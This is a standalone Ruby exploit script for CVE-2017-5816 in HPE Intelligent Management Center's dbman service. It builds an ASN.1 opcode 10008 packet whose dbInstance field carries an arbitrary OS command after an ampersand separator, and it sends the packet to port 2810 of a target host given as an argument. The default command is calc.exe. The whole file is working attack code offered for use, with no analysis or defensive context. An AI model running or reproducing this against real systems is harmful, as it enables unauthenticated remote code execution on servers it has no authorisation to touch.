#!/usr/bin/env ruby
# Hewlett Packard Enterprise Intelligent Management Center dbman Opcode 10008 Command Injection Remote Code Execution Vulnerability
# CVE-2017-5816

require 'rex'

host = ARGV[0]
cmd  = ARGV[1] || "calc.exe"

opcode = [10008].pack('N*')

def usage
	puts "[*] #{$0} <host> [os-command]"
	exit
end

def enc_asn1(str)
        Rex::Proto::NTLM::Utils::asn1encode(str)
end

def enc_constr(*str_arr)
        "\x23" + enc_asn1(str_arr.join(''))
end

usage if ARGV.size < 1

dbip = host
iDBType = "4"
os_command = cmd
dbInstance = "a\"& " + os_command + " &"
dbSaUserName = Rex::Text.rand_text_alpha_upper(rand(10))
dbSaPassword = Rex::Text.rand_text_alpha_upper(rand(10))
strOraDbIns = Rex::Text.rand_text_alpha_upper(rand(10))

a = "\x04" + enc_asn1(dbip)
b = "\x02\x01\x04" # constant
c = "\x04" + enc_asn1(dbInstance)
d = "\x04" + enc_asn1(dbSaUserName)
e = "\x04" + enc_asn1(dbSaPassword)
f = "\x04" + enc_asn1(strOraDbIns)

msg = a + b + c + d + e + f

encodedmsg = enc_constr(msg)
wizzle = [encodedmsg.size].pack('N')
msgsize = msg.size
sizzle = [msgsize].pack('c*')
buff = opcode + wizzle + "\x30" + sizzle + msg

begin
	sock = Rex::Socket::Tcp.create('PeerHost'  => host, 'PeerPort'  => 2810)
	puts "[*] Executing '#{cmd}' ..."
	sock.write(buff)
	sock.close
rescue => e
	puts "[!] #{e.to_s} ..."
end
